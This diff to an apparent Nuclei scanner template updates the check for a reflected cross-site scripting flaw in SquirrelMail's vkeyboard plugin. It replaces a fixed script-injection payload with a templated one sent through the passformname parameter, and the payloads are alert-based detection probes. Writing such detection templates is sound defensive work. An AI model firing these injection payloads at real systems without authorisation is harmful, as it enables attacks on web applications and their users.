@@ -6,7 +6,7 @@ http:
   - part: body
     type: word
     words:
-    - </script><script>alert(document.domain)</script>
+    - onclick="window.opener.document.forms[0].{{payload}}
   - part: header
     type: word
     words:
@@ -14,7 +14,7 @@ http:
   matchers-condition: and
   method: GET
   path:
-  - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+  - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname={{url_encode(payload)}}'
 id: squirrelmail-vkeyboard-xss
 info:
   author: dhiyaneshDk
@@ -35,3 +35,5 @@ info:
   - https://www.exploit-db.com/exploits/34814
   severity: medium
   tags: xss,squirrelmail,plugin,edb
+variables:
+  payload: '"><script>alert({{rand_int()}});</script><script>/*'
